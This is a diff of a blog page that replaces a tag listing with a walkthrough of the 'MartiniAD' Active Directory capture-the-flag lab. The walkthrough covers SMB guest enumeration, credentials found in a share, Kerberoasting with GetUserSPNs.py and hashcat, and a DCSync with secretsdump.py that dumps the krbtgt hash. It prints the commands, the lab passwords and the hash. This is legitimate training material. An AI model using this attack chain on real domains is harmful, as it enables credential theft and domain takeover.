@@ -3,22 +3,22 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Ctf | Null Blog</title>
-<meta property="og:title" content="Ctf | Null Blog" />
-<meta name="twitter:title" content="Ctf | Null Blog" />
-<meta itemprop="name" content="Ctf | Null Blog" />
-<meta name="application-name" content="Ctf | Null Blog" />
+<title itemprop="name">MartiniAD - Walkthrough | Null Blog</title>
+<meta property="og:title" content="MartiniAD - Walkthrough | Null Blog" />
+<meta name="twitter:title" content="MartiniAD - Walkthrough | Null Blog" />
+<meta itemprop="name" content="MartiniAD - Walkthrough | Null Blog" />
+<meta name="application-name" content="MartiniAD - Walkthrough | Null Blog" />
 <meta property="og:site_name" content="Null Blog" />
 
-<meta name="description" content="CTF writeups, hacking notes, and walkthroughs.">
-<meta itemprop="description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta name="description" content="Walkthrough for the MartiniAD machine.">
+<meta itemprop="description" content="Walkthrough for the MartiniAD machine." />
+<meta property="og:description" content="Walkthrough for the MartiniAD machine." />
+<meta name="twitter:description" content="Walkthrough for the MartiniAD machine." />
 
 <meta property="og:locale" content="en-US" />
 <meta name="language" content="en-US" />
 
-  <link rel="alternate" hreflang="en" href="https://nvru.github.io/tags/ctf/" title="" />
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/walkthrough/hsm/martiniad/" title="" />
 
 
 
@@ -28,26 +28,33 @@
 <meta name="generator" content="Hugo 0.165.0">
 
     
-    <meta property="og:url" content="https://nvru.github.io/tags/ctf/">
+    <meta property="og:url" content="https://nvru.github.io/walkthrough/hsm/martiniad/">
 	<meta property="og:site_name" content="Null Blog">
-	<meta property="og:title" content="Ctf">
-	<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta property="og:title" content="MartiniAD - Walkthrough">
+	<meta property="og:description" content="Walkthrough for the MartiniAD machine.">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="website">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="walkthrough">
+		<meta property="article:published_time" content="2026-08-22T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-08-22T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Walkthrough">
+		<meta property="article:tag" content="Windows">
+		<meta property="article:tag" content="Active-Directory">
+		<meta property="article:tag" content="Smb">
+		<meta property="article:tag" content="Kerberoasting">
 
 
     
     
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Ctf">
-	<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta name="twitter:title" content="MartiniAD - Walkthrough">
+	<meta name="twitter:description" content="Walkthrough for the MartiniAD machine.">
 
 
     
 
-    <link rel="canonical" href="https://nvru.github.io/tags/ctf/">
-    <link href="/tags/ctf/index.xml" rel="alternate" type="application/rss+xml" title="Null Blog">
-    <link href="/tags/ctf/index.xml" rel="feed" type="application/rss+xml" title="Null Blog">
+    <link rel="canonical" href="https://nvru.github.io/walkthrough/hsm/martiniad/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -109,7 +116,7 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/walkthrough/">
+                    <a class="menu-link active" href="/walkthrough/">
                         Walkthroughs
                     </a>
                     
@@ -165,695 +172,149 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Ctf</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2026</h2>
-
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/martiniad/">MartiniAD - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-08-22T00:00:00Z">
-        22 Aug 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/exception/">Exception - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-08-17T00:00:00Z">
-        17 Aug 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/sysadmins/">Sysadmins - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-08-16T00:00:00Z">
-        16 Aug 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/casino/">Casino - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-08-15T00:00:00Z">
-        15 Aug 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/rooted/">Rooted - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-08-12T00:00:00Z">
-        12 Aug 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/bruteforcelab/">BruteforceLab - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-31T00:00:00Z">
-        31 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/longshao/">Longshao - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-30T00:00:00Z">
-        30 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/hommie/">Hommie - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-28T00:00:00Z">
-        28 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/vulnhub/hackable2/">Hackable II - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-27T00:00:00Z">
-        27 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/samurai/">Samurai - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-26T00:00:00Z">
-        26 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/hunter/">Hunter - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-25T00:00:00Z">
-        25 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/dark/">Dark - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-25T00:00:00Z">
-        25 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/noob/">Noob - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-24T00:00:00Z">
-        24 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/observer/">Observer - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-23T00:00:00Z">
-        23 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/system/">System - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-22T00:00:00Z">
-        22 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/baseme/">Baseme - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-22T00:00:00Z">
-        22 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/iot/">IoT - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-21T00:00:00Z">
-        21 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/hostname/">Hostname - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-21T00:00:00Z">
-        21 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/vulnhub/who_wants_to_be_king1/">Who Wants to Be King? 1 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-20T00:00:00Z">
-        20 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/vulnhub/colddbox/">ColddBox - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-20T00:00:00Z">
-        20 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/vulnhub/chronos/">Chronos - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-19T00:00:00Z">
-        19 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/p4l4nc4/">p4l4nc4 (Palanca) - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-18T00:00:00Z">
-        18 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/economists/">Economists - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-17T00:00:00Z">
-        17 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/friendly/">Friendly - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-16T00:00:00Z">
-        16 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/hannah/">Hannah - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-15T00:00:00Z">
-        15 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/printer2/">Printer2 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-14T00:00:00Z">
-        14 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/printer/">Printer - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-13T00:00:00Z">
-        13 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/htb/cctv/">CCTV - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-12T00:00:00Z">
-        12 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/pingme/">Pingme - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-11T00:00:00Z">
-        11 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/immortal/">Immortal - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-10T00:00:00Z">
-        10 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan113/">Yuan113 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan112/">Yuan112 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan111/">Yuan111 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan114/">Yuan114 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-08T00:00:00Z">
-        8 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/jabita/">Jabita - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-07T00:00:00Z">
-        7 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/translator/">Translator - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-06T00:00:00Z">
-        6 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/find/">Find - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-06T00:00:00Z">
-        6 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/helix/">Helix - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-05T00:00:00Z">
-        5 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/suidy/">The Suidy - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-04T00:00:00Z">
-        4 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/phantom/">Phantom - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-03T00:00:00Z">
-        3 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/darkside/">The DarkSide - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-01T00:00:00Z">
-        1 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/bonjur/">Bonjur - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-01T00:00:00Z">
-        1 Jul 2026
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+        <article>
+            <header class="header">
+                <h1 class="header-title">MartiniAD - Walkthrough</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-08-22T00:00:00&#43;00:00" itemprop="datePublished"> 22 Aug 2026 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+        <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+        <li><a href="#credential-discovery">Credential Discovery</a></li>
+      </ul>
+    </li>
+    <li><a href="#credential-access">Credential Access</a>
+      <ul>
+        <li><a href="#kerberoasting">Kerberoasting</a></li>
+      </ul>
+    </li>
+    <li><a href="#domain-compromise">Domain Compromise</a>
+      <ul>
+        <li><a href="#dcsync">DCSync</a></li>
+      </ul>
+    </li>
+    <li><a href="#credentials">Credentials</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="overview">Overview</h2>
+<ul>
+<li><strong>Platform:</strong> HackSmarter</li>
+<li><strong>Difficulty:</strong> <code>Easy</code></li>
+<li><strong>OS:</strong> Windows</li>
+<li><strong>Attacker IP:</strong> <code>10.200.84.4</code></li>
+<li><strong>Target IP:</strong> <code>10.1.179.33</code></li>
+</ul>
+<p>The objective was to enumerate the Active Directory environment, identify exposed credentials, perform Kerberoasting to recover a service account password, and obtain the <code>krbtgt</code> NT hash.</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>The initial scan revealed a typical Active Directory Domain Controller.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws
+</span></span></code></pre></div><p>The scan also revealed the domain name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DC01.DRY.MARTINI.BARS
+</span></span></code></pre></div><p>To simplify name resolution, I added the domain to <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.1.140.107 DRY.MARTINI.BARS&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><hr>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>I first tested SMB using anonymous credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.1.140.107 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span></code></pre></div><p>An unusual share named <strong>notes</strong> was visible, although anonymous users did not have access to it.</p>
+<p><img src="/images/hsm/martiniad/nxc_null.png" alt="Anonymous SMB Enumeration"></p>
+<p>Since Windows environments commonly expose the Guest account, I tested it next.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.1.140.107 -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span></code></pre></div><p>The Guest account authenticated successfully and had read/write access to the <strong>notes</strong> share, along with read access to the <code>IPC$</code> share.</p>
+<p><img src="/images/hsm/martiniad/nxc_guest.png" alt="Guest SMB Enumeration"></p>
+<p>Because the Guest account could access <code>IPC$</code>, I enumerated the domain users.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.1.140.107 -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid
+</span></span></code></pre></div><p><img src="/images/hsm/martiniad/found_users.png" alt="RID Enumeration"></p>
+<p>The following accounts were discovered:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>DC01$
+</span></span><span style="display:flex;"><span>mprice
+</span></span><span style="display:flex;"><span>athena.t0
+</span></span><span style="display:flex;"><span>ATHENA_SVC
+</span></span></code></pre></div><hr>
+<h3 id="credential-discovery">Credential Discovery</h3>
+<p>Using the Guest account, I connected to the <code>notes</code> share.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient <span style="color:#ae81ff">\\\\</span>DRY.MARTINI.BARS<span style="color:#ae81ff">\\</span>notes -U guest
+</span></span></code></pre></div><p>Inside the share I found a file named <code>notes.txt</code>.</p>
+<p><img src="/images/hsm/martiniad/found_notes_txt.png" alt="notes.txt"></p>
+<p>After downloading and reading the file, it contained credentials for the <code>mprice</code> account.</p>
+<p><img src="/images/hsm/martiniad/cat_notes.png" alt="Credentials in notes.txt"></p>
+<p>I verified the credentials against SMB.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.1.140.107 -u mprice -p <span style="color:#e6db74">&#39;*martini*&#39;</span> --shares
+</span></span></code></pre></div><p>The login was successful.</p>
+<p><img src="/images/hsm/martiniad/nxc_mprice.png" alt="Successful Login"></p>
+<hr>
+<h2 id="credential-access">Credential Access</h2>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p>Although the <code>mprice</code> account was low privileged, it was sufficient to continue enumerating Active Directory.</p>
+<p>The <code>ATHENA_SVC</code> account appeared to be a service account, making it a suitable Kerberoasting target.</p>
+<p>I requested the available Service Principal Names (SPNs).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GetUserSPNs.py -dc-ip 10.1.140.107 DRY.MARTINI.BARS/mprice:<span style="color:#e6db74">&#39;*martini*&#39;</span> -outputfile misc/ker.krb
+</span></span></code></pre></div><p>The Kerberos service ticket was then cracked with Hashcat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13100</span> -a <span style="color:#ae81ff">0</span> misc/ker.krb /opt/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+</span></span></code></pre></div><p>The recovered password was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1dirtymartini
+</span></span></code></pre></div><p>To verify the credentials, I authenticated using NetExec.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.1.140.107 -u athena.t0 -p <span style="color:#e6db74">&#39;1dirtymartini&#39;</span> --shares
+</span></span></code></pre></div><p>The output confirmed that <code>athena.t0</code> had administrative privileges on the domain.</p>
+<hr>
+<h2 id="domain-compromise">Domain Compromise</h2>
+<h3 id="dcsync">DCSync</h3>
+<p>With Domain Administrator credentials available, I could perform a DCSync attack to retrieve password hashes from Active Directory.</p>
+<p>To dump every account:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump.py <span style="color:#e6db74">&#39;athena.t0:1dirtymartini@DC01.DRY.MARTINI.BARS&#39;</span>
+</span></span></code></pre></div><p>Since the objective was only to obtain the <code>krbtgt</code> hash, I limited the dump to that account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump.py -just-dc-user krbtgt <span style="color:#e6db74">&#39;athena.t0:1dirtymartini@DC01.DRY.MARTINI.BARS&#39;</span>
+</span></span></code></pre></div><p><img src="/images/hsm/martiniad/krbtgt_hash.png" alt="KRBTGT Hash"></p>
+<p>The command successfully returned the NT hash for the <code>krbtgt</code> account.</p>
+<hr>
+<h2 id="credentials">Credentials</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>mprice:*martini*
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>athena.t0:1dirtymartini
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>krbtgt:22ebc290e67668629c8d0812662a9c51
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
